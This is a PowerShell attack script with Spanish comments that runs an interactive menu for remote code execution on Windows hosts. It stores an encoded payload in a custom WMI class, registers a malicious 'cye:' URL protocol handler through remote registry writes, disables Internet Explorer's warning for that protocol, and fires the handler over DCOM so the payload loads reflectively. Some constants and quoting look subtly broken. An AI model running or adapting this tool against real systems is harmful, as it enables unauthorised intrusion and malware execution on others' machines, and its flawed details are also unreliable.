param (
    [string]$remoteHost,
    [string]$payloadPath,
    [string]$username,
    [string]$password
)

function Get-Input {
    param (
        [string]$prompt
    )
    return Read-Host -Prompt $prompt
}

# Verifica y solicita las entradas del usuario si no son proporcionadas
if (-not $remoteHost) {
    $remoteHost = Get-Input "Enter the remote host name or IP"
}
if (-not $payloadPath) {
    $payloadPath = Get-Input "Enter the local payload path"
}
if (-not $username) {
    $username = Get-Input "Enter the username"
}
if (-not $password) {
    $password = Get-Input "Enter the password"
}

# Función para crear un protocolo URL personalizado en el host remoto
function Create-URLProtocol {
    param (
        [string]$remoteHost
    )
    <#
    .SYNOPSIS
    Crea un protocolo URL personalizado en el host remoto.
    .PARAMETER remoteHost
    El nombre o dirección IP del host remoto.
    #>

    # Inicializa el objeto WMI en el host remoto
    $RemoteWaMI = [WMIClass] "\\$remoteHost\root\default:StdRegProv"

    # Crea las claves de registro necesarias
    $RemoteWaMI.CreateKey(2137483650, "Software\Classes\cye")
    $RemoteWaMI.SetStringValue(2137483650, "Software\Classes\cye", "URL Protocol", $null)

    $RemoteWaMI.CreateKey(2137483650, "Software\Classes\cye\shell")
    $RemoteWaMI.CreateKey(2137483650, "Software\Classes\cye\shell\open")
    $RemoteWaMI.CreateKey(2137483650, "Software\Classes\cye\shell\open\command")

    # Comando PowerShell para ejecutar el payload en el host remoto
    $cmd = "powershell -c `[System.Reflection.Assembly]::Load(([Convert]::FromBase64String((([WmiClass]'root\default:Win32_DataInfilClass').Properties['File'].Value))))"
    $RemoteWaMI.SetStringValue(2137483650, "Software\Classes\cye\shell\open\command", $null, $cmd)
}

# Función para invocar el protocolo URL personalizado a través de Internet Explorer
function Invoke-URLProtocol {
    param (
        [string]$remoteHost
    )
    <#
    .SYNOPSIS
    Invoca el protocolo URL personalizado a través de Internet Explorer en el host remoto.
    .PARAMETER remoteHost
    El nombre o dirección IP del host remoto.
    #>

    $ie = [System.Activator]::CreateInstance([System.Type]::GetTypeFromProgID("internetexplorer.application", "\\$remoteHost"))
    $ie.Navigate2("cye:blabla")
    $ie.Quit()
}

# Función para deshabilitar advertencias de seguridad en Internet Explorer para el protocolo personalizado
function Disable-IEWarning {
    param (
        [string]$remoteHost
    )
    <#
    .SYNOPSIS
    Deshabilita la advertencia de seguridad para el protocolo URL personalizado en Internet Explorer.
    .PARAMETER remoteHost
    El nombre o dirección IP del host remoto.
    #>

    $RemoteWami = [WMIClass]"\\$remoteHost\root\default:StdRegProv"
    $RemoteWami.CreateKey(2147483651, "SID\\Software\\Microsoft\\Internet Explorer\\ProtocolExecute\\cye")
    $RemoteWami.SetDWORDValue(2147483651, "SID\\Software\\Microsoft\\Internet Explorer\\ProtocolExecute\\cye", "WarnOnOpen", 0)
}

# Función para subir y ejecutar un payload en el host remoto
function Upload-And-ExecutePayload {
    param (
        [string]$remoteHost,
        [string]$payloadPath,
        [string]$username,
        [string]$password
    )
    <#
    .SYNOPSIS
    Sube y ejecuta un payload codificado en base64 en el host remoto.
    .PARAMETER remoteHost
    El nombre o dirección IP del host remoto.
    .PARAMETER payloadPath
    La ruta local del payload a subir.
    .PARAMETER username
    El nombre de usuario para la autenticación.
    .PARAMETER password
    La contraseña para la autenticación.
    #>

    # Lee y codifica el contenido del archivo en base64
    $FileBytes = [IO.File]::ReadAllBytes($payloadPath)
    $EncodedFileContent = [Convert]::ToBase64String($FileBytes)

    # Configura las opciones de conexión WMI
    $Options = New-Object System.Management.ConnectionOptions
    $Options.Username = $username
    $Options.Password = $password
    $Options.EnablePrivileges = $true

    # Establece la conexión WMI al host remoto
    $Connection = New-Object System.Management.ManagementScope
    $Connection.Path = "\\$remoteHost\root\default"
    $Connection.Options = $Options
    $Connection.Connect()

    # Inserta el payload codificado en la clase WMI personalizada
    $DataInfilClass = New-Object System.Management.ManagementClass($Connection, [String]::Empty, $null)
    $DataInfilClass['__CLASS'] = 'Win32_DataInfilClass'
    $DataInfilClass.Properties.Add('File', [System.Management.CimType]::String, $false)
    $DataInfilClass.Properties['File'].Value = $EncodedFileContent
    $DataInfilClass.Put()

    # Prepara el comando para ejecutar el payload
    $cmd = "powershell -c `[System.Reflection.Assembly]::Load((`[Convert]::FromBase64String((([WmiClass]'root\\default:Win32_DataInfilClass').Properties['File'].Value))))`"
    
    # Crea las claves de registro para ejecutar el payload a través del protocolo URL
    $RemoteWaMI = [WMIClass]"\\$remoteHost\root\default:StdRegProv"
    $RemoteWaMI.CreateKey(2137483650, "Software\Classes\cye")
    $RemoteWaMI.SetStringValue(2137483650, "Software\Classes\cye", "URL Protocol", $null)
    $RemoteWaMI.CreateKey(2137483650, "Software\Classes\cye\shell")
    $RemoteWaMI.CreateKey(2137483650, "Software\Classes\cye\shell\open")
    $RemoteWaMI.CreateKey(2137483650, "Software\Classes\cye\shell\open\command")
    $RemoteWaMI.SetStringValue(2137483650, "Software\Classes\cye\shell\open\command", $null, $cmd)
}

# Función para mostrar un menú de selección de opciones
function Show-Menu {
    <#
    .SYNOPSIS
    Muestra un menú para seleccionar opciones.
    #>
    Write-Host "`nSelect an option:"
    Write-Host "1. Create custom URL protocol"
    Write-Host "2. Invoke URL protocol through IE (DCOM)"
    Write-Host "3. Disable IE warnings for protocol"
    Write-Host "4. Upload and execute payload"
    Write-Host "5. Exit"
}

# Bucle del menú principal
do {
    Show-Menu
    $choice = Read-Host "Enter your choice"

    switch ($choice) {
        1 {
            Create-URLProtocol -remoteHost $remoteHost
        }
        2 {
            Invoke-URLProtocol -remoteHost $remoteHost
        }
        3 {
            Disable-IEWarning -remoteHost $remoteHost
        }
        4 {
            Upload-And-ExecutePayload -remoteHost $remoteHost -payloadPath $payloadPath -username $username -password $password
        }
        5 {
            Write-Host "Exiting..."
            break
        }
        default {
            Write-Host "Invalid option, please try again."
        }
    }
} while ($choice -ne 5)
